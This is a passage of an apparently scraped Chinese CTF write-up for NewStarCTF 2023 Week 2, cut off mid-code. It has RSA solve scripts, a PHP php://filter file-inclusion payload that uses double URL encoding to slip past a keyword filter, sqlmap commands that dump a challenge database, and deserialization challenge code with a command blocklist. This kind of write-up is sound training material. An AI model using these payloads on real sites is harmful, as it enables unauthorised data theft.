            "content_html": "<h1 id=\"newstarctf-2023-公开赛道-week2\"><a class=\"markdownIt-Anchor\" href=\"#newstarctf-2023-公开赛道-week2\">#</a> NewStarCTF 2023 公开赛道 Week2</h1>\n<h2 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"滴啤\"><a class=\"markdownIt-Anchor\" href=\"#滴啤\">#</a> 滴啤</h3>\n<p><strong>考点：dp 泄露</strong></p>\n<p>题目如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> flag <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">gen_prime</span><span class=\"token punctuation\">(</span>number<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span>number<span class=\"token operator\">//</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span>number<span class=\"token operator\">//</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">,</span>q</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">,</span>q <span class=\"token operator\">=</span> gen_prime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">*</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>d<span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>p<span class=\"token operator\">*</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># 93172788492926438327710592564562854206438712390394636149385608321800134934361353794206624031396988124455847768883785503795521389178814791213054124361007887496351504099772757164211666778414800698976335767027868761735533195880182982358937211282541379697714874313863354097646233575265223978310932841461535936931</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># 307467153394842898333761625034462907680907310539113349710634557900919735848784017007186630645110812431448648273172817619775466967145608769260573615221635</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># 52777705692327501332528487168340175436832109866218597778822262268417075157567880409483079452903528883040715097136293765188858187142103081639134055997552543213589467751037524482578093572244313928030341356359989531451789166815462417484822009937089058352982739611755717666799278271494933382716633553199739292089</span></pre></td></tr></table></figure><p>现在已知：n、dp (d mod (p-1))、c、e</p>\n<p>一般的 RSA 题目不会给出 dp，因此本题属于 dp 泄露，利用 dp 求出其余元素，进而得到最终的答案：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from flag import flag</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">gen_prime</span><span class=\"token punctuation\">(</span>number<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span>number<span class=\"token operator\">//</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span>number<span class=\"token operator\">//</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">,</span>q</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getd</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>dp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>dp<span class=\"token operator\">*</span>e<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>i <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            p <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>dp<span class=\"token operator\">*</span>e<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">//</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">if</span> n <span class=\"token operator\">%</span> p <span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                q <span class=\"token operator\">=</span> n <span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                phi<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                <span class=\"token keyword\">return</span> d</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">93172788492926438327710592564562854206438712390394636149385608321800134934361353794206624031396988124455847768883785503795521389178814791213054124361007887496351504099772757164211666778414800698976335767027868761735533195880182982358937211282541379697714874313863354097646233575265223978310932841461535936931</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>dp <span class=\"token operator\">=</span> <span class=\"token number\">307467153394842898333761625034462907680907310539113349710634557900919735848784017007186630645110812431448648273172817619775466967145608769260573615221635</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">52777705692327501332528487168340175436832109866218597778822262268417075157567880409483079452903528883040715097136293765188858187142103081639134055997552543213589467751037524482578093572244313928030341356359989531451789166815462417484822009937089058352982739611755717666799278271494933382716633553199739292089</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>d <span class=\"token operator\">=</span> getd<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>dp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>flag 为： <code>flag&#123;cd5ff82d-989c-4fbf-9543-3f98ab567546&#125;</code></p>\n<h3 id=\"不止一个pi\"><a class=\"markdownIt-Anchor\" href=\"#不止一个pi\">#</a> 不止一个 pi</h3>\n<p>题目：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> flag <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">**</span><span class=\"token number\">3</span><span class=\"token operator\">*</span>q<span class=\"token operator\">**</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"q = \"</span><span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"p = \"</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span><span class=\"token number\">65537</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c = \"</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># q =  115478867870347527660680329271012852043845868401928361076102779938370270670897498759391844282137149013845956612257534640259997979275610235395706473965973203544920469416283181677660262509481282536465796731401967694683575843183509430017972506752901270887444490905891490955975762524187534052478173966117471143713</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># p =  171790960371317244087615913047696670778115765201883835525456016207966048658582417842936925149582378305610304505530997833147251832289276125084339614808085356814202236463900384335878760177630501950384919794386619363394169016560485152083893183420911295712446925318391793822371390439655160077212739260871923935217</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># c =  4459183928324369762397671605317600157512712503694330767938490496225669985050002776253470841193156951087663107866714426230222002399666306287642591077990897883174134404896800482234781531592939043551832049756571987010173667074168282355520711905659013076509353523088583347373358980842707686611157050425584598825151399870268083867269912139634929397957514376826145870752116583185351576051776627208882377413433140577461314504762388617595282085102271510792305560608934353515552201553674287954987323321512852114353266359364282603487098916608302944694600227628787791876600901537888110093703612414836676571562487005330299996908873589228072982641114844761980143047920770114535924959765518365614709272297666231481655857243004072049094078525569460293381479558148506346966064906164209362147313371962567040047084516510135054571080612077333228195608109065475260832580192321853906138811139036658485688320161530131239854003996457871663456850196483520239675981391047452381998620386899101820782421605287708727667663038905378115235163773867508258208867367314108701855709002634592329976912239956212490788262396106230191754680813790425433763427315230330459349320412354189010684525105318610102936715203529222491642807382215023468936755584632849348996666528981269240867612068382243822300418856599418223875522408986596925018975565057696218423036459144392625166761522424721268971676010427096379610266649911939139451989246194525553533699831110568146220347603627745407449761792135898110139743498767543521297525802809254842518002190381508964357001211353997061417710783337</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># e = 65537</span></pre></td></tr></table></figure><p><strong>本题目如果直接使用 c,d,n 进行求解的话无法给出正确答案 (原因？)</strong>。可以用中国剩余定理进行求解，但是不清楚为什么虽然 n 是由多个素数：p，p，p，q，q 组成的，但是只用了 p 和 q 进行了一次中国剩余定理就得到了正确答案，可能因为本质上只是有两个元素 p，q？？：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># from flag import flag</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>q <span class=\"token operator\">=</span>  <span class=\"token number\">115478867870347527660680329271012852043845868401928361076102779938370270670897498759391844282137149013845956612257534640259997979275610235395706473965973203544920469416283181677660262509481282536465796731401967694683575843183509430017972506752901270887444490905891490955975762524187534052478173966117471143713</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p <span class=\"token operator\">=</span>  <span class=\"token number\">171790960371317244087615913047696670778115765201883835525456016207966048658582417842936925149582378305610304505530997833147251832289276125084339614808085356814202236463900384335878760177630501950384919794386619363394169016560485152083893183420911295712446925318391793822371390439655160077212739260871923935217</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">**</span><span class=\"token number\">3</span><span class=\"token operator\">*</span>q<span class=\"token operator\">**</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">**</span><span class=\"token number\">3</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">**</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>c <span class=\"token operator\">=</span>  <span class=\"token number\">4459183928324369762397671605317600157512712503694330767938490496225669985050002776253470841193156951087663107866714426230222002399666306287642591077990897883174134404896800482234781531592939043551832049756571987010173667074168282355520711905659013076509353523088583347373358980842707686611157050425584598825151399870268083867269912139634929397957514376826145870752116583185351576051776627208882377413433140577461314504762388617595282085102271510792305560608934353515552201553674287954987323321512852114353266359364282603487098916608302944694600227628787791876600901537888110093703612414836676571562487005330299996908873589228072982641114844761980143047920770114535924959765518365614709272297666231481655857243004072049094078525569460293381479558148506346966064906164209362147313371962567040047084516510135054571080612077333228195608109065475260832580192321853906138811139036658485688320161530131239854003996457871663456850196483520239675981391047452381998620386899101820782421605287708727667663038905378115235163773867508258208867367314108701855709002634592329976912239956212490788262396106230191754680813790425433763427315230330459349320412354189010684525105318610102936715203529222491642807382215023468936755584632849348996666528981269240867612068382243822300418856599418223875522408986596925018975565057696218423036459144392625166761522424721268971676010427096379610266649911939139451989246194525553533699831110568146220347603627745407449761792135898110139743498767543521297525802809254842518002190381508964357001211353997061417710783337</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"q = \"</span><span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"p = \"</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>dp <span class=\"token operator\">=</span> d <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>dq <span class=\"token operator\">=</span> d <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Cp <span class=\"token operator\">=</span> c <span class=\"token operator\">%</span> p</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>Cq <span class=\"token operator\">=</span> c <span class=\"token operator\">%</span> q</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>qInv <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>mp <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>Cp<span class=\"token punctuation\">,</span>dp<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>mq <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>Cq<span class=\"token punctuation\">,</span>dq<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>h <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>qInv<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>mp<span class=\"token operator\">-</span>mq<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>p</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>m12 <span class=\"token operator\">=</span> mq <span class=\"token operator\">+</span> h<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>m12<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># c =  4459183928324369762397671605317600157512712503694330767938490496225669985050002776253470841193156951087663107866714426230222002399666306287642591077990897883174134404896800482234781531592939043551832049756571987010173667074168282355520711905659013076509353523088583347373358980842707686611157050425584598825151399870268083867269912139634929397957514376826145870752116583185351576051776627208882377413433140577461314504762388617595282085102271510792305560608934353515552201553674287954987323321512852114353266359364282603487098916608302944694600227628787791876600901537888110093703612414836676571562487005330299996908873589228072982641114844761980143047920770114535924959765518365614709272297666231481655857243004072049094078525569460293381479558148506346966064906164209362147313371962567040047084516510135054571080612077333228195608109065475260832580192321853906138811139036658485688320161530131239854003996457871663456850196483520239675981391047452381998620386899101820782421605287708727667663038905378115235163773867508258208867367314108701855709002634592329976912239956212490788262396106230191754680813790425433763427315230330459349320412354189010684525105318610102936715203529222491642807382215023468936755584632849348996666528981269240867612068382243822300418856599418223875522408986596925018975565057696218423036459144392625166761522424721268971676010427096379610266649911939139451989246194525553533699831110568146220347603627745407449761792135898110139743498767543521297525802809254842518002190381508964357001211353997061417710783337</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># e = 65537</span></pre></td></tr></table></figure><p><code>flag&#123;bu_zhi_yige_p1dsaf&#125;</code></p>\n<h2 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> Web</h2>\n<h3 id=\"游戏高手\"><a class=\"markdownIt-Anchor\" href=\"#游戏高手\">#</a> 游戏高手</h3>\n<p>直接修改当前游戏的 gameScore 值，即可获得 flag</p>\n<p><img data-src=\"image-20231009120718139.png\" alt=\"image-20231009120718139\"></p>\n<p><code>flag&#123;d37b9e39-db1d-44c0-9857-a13e2d050ff6&#125;</code></p>\n<h3 id=\"include-0-0\"><a class=\"markdownIt-Anchor\" href=\"#include-0-0\">#</a> include 0。0</h3>\n<p>包含也有危害？</p>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// FLAG in the flag.php</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/base|rot/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    @<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token delimiter important\">?></span></pre></td></tr></table></figure><p>用 filter 获得相关参数：</p>\n<pre><code>http://8f160d03-3828-4fc4-86db-8799b5445d6f.node4.buuoj.cn:81/?file=php://filter/convert.base64-encode/resource=flag.php\n</code></pre>\n<p>但是这样会被检测到 base，使用 hackbar 的 Encoding 功能，将 base64 字段编译两次：</p>\n<pre><code>http://8f160d03-3828-4fc4-86db-8799b5445d6f.node4.buuoj.cn:81/?file=php://filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34-encode/resource=flag.php\n</code></pre>\n<p>在传入就可以获得 flag 的 base64 格式，解码后得到答案：</p>\n<pre><code>PD9waHAgLy9mbGFne2FkNTgyMGFmLTI3NGYtNDdlNC04NTE1LTY4ZjBmYWI3ZjAyOH0K\n</code></pre>\n<p><img data-src=\"image-20231009172652269.png\" alt=\"image-20231009172652269\"></p>\n<p><code>flag&#123;ad5820af-274f-47e4-8515-68f0fab7f028&#125;</code></p>\n<h3 id=\"ez_sql\"><a class=\"markdownIt-Anchor\" href=\"#ez_sql\">#</a> ez_sql</h3>\n<p>题目如下：</p>\n<p><img data-src=\"image-20231010174741588.png\" alt=\"image-20231010174741588\"></p>\n<p>直接用 sqlmap 开查，先查看有什么 table：</p>\n<pre><code>sqlmap -u http://289cffc1-b11a-4434-9d3a-0712195f3120.node4.buuoj.cn:81/?id=TMP0919 --dbs\n</code></pre>\n<p><img data-src=\"image-20231010175019340.png\" alt=\"image-20231010175019340\"></p>\n<p>其中我们的 flag 在 ctf 表中：</p>\n<pre><code>sqlmap -u http://289cffc1-b11a-4434-9d3a-0712195f3120.node4.buuoj.cn:81/?id=TMP0919 -D ctf --tables\n</code></pre>\n<p><img data-src=\"image-20231010175114105.png\" alt=\"image-20231010175114105\"></p>\n<p>得到 flag：</p>\n<pre><code>sqlmap -u http://289cffc1-b11a-4434-9d3a-0712195f3120.node4.buuoj.cn:81/?id=TMP0919 -D ctf -T here_is_flag --dump\n</code></pre>\n<p><img data-src=\"image-20231010175142543.png\" alt=\"image-20231010175142543\"></p>\n<h3 id=\"unserialize\"><a class=\"markdownIt-Anchor\" href=\"#unserialize\">#</a> Unserialize？</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzNTY3MDY1L2FydGljbGUvZGV0YWlscy8xMjc5MDA3MTg=\">什么是 PHP 反序列化？</span></p>\n<p>本题考查 PHP 反序列化，题目如下：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// Maybe you need learn some knowledge about deserialize?</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">evil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$cmd</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/cat|tac|more|tail|base/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token 